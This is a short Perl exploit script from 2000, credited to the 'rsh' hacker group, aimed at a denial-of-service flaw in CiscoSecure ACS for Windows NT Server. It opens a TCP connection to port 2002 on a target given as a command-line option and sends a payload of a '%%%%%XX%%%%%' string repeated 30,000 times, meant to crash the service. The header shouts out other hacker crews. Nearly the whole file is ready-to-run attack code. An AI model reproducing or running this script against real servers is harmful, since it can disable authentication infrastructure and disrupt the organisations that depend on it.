#!/usr/bin/perl
#
# Coded by:netsym and doom for rsh
# rootshellhackers@hushmail.com and smashstack@hushmail.com
# http://www.8op.com/rsh
# Denial of Service Vulnerability in CiscoSecure ACS for Windows NT Server
# detailed in Cisco advisory CSCdr68286
# It would be nice for someone who knows asm for Windows to email us
# Thanks to Dethy,Datagram,Mixter,Anarcho,bi0cide,Initd,0x7f Security Research,
# Matic,Mystik,Kave,Sniper of Dugnet,Sniper of GForce,Piffy and RootShellHackers
# It is sad that people have too do what I have seen Hitler's Crew do in there
# latest defacements on Attrition located at attrition.org

use IO::Socket;
use Getopt::Std;
getopts('s:', \%args);
if(!defined($args{s})){&usage; }
$serv = $args{s};
$foo = "%%%%%XX%%%%%"; $number = 30000;
$data .= $foo x $number; $EOL="\015\012";
$remote = IO::Socket::INET->new(
                    Proto       => "tcp",
                    PeerAddr    => $args{s},
                    PeerPort    => "(2002)",
                ) || die("Unable to connect to port 2002 on $args{s}\n");
$remote->autoflush(1);
print $remote "$data". $EOL;
while (<$remote>){ print }

print("\nPackets Sent\n");

sub usage {die("\n$0 -s <server>\n\n");}
#                   www.hack.co.za   [29 September 2000]#